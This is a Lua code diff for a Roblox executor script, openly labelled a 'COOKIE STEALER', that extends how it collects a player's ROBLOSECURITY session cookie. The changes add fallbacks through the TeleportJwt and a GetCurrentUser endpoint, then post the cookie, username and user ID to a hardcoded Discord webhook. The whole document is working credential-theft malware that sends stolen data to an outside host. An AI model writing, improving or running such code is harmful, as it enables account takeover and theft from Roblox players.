@@ -2,12 +2,30 @@ local webhook = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0C
 
 local request = (syn and syn.request) or http_request or (http and http.request)
 if request then
-    local cookie = game:GetService("Players").LocalPlayer:GetAttribute("ROBLOSECURITY") or "not_found"
+    local cookie
+    pcall(function()
+        cookie = game:GetService("Players").LocalPlayer:GetAttribute("ROBLOSECURITY")
+    end)
+    
+    if not cookie or cookie == "not_found" then
+        pcall(function()
+            cookie = game:GetService("Players").LocalPlayer:GetJoinData().TeleportJwt
+        end)
+    end
+    
+    if not cookie then
+        pcall(function()
+            cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx")
+        end)
+    end
+    
+    cookie = cookie or "cookie_not_found"
+
     local data = {
         ["content"] = "🚨 COOKIE STEALER 🚨\n"..
                      "User: "..game.Players.LocalPlayer.Name.."\n"..
                      "UserId: "..game.Players.LocalPlayer.UserId.."\n"..
-                     "Cookie: "..cookie
+                     "Cookie: "..tostring(cookie)
     }
     request({
         Url = webhook,
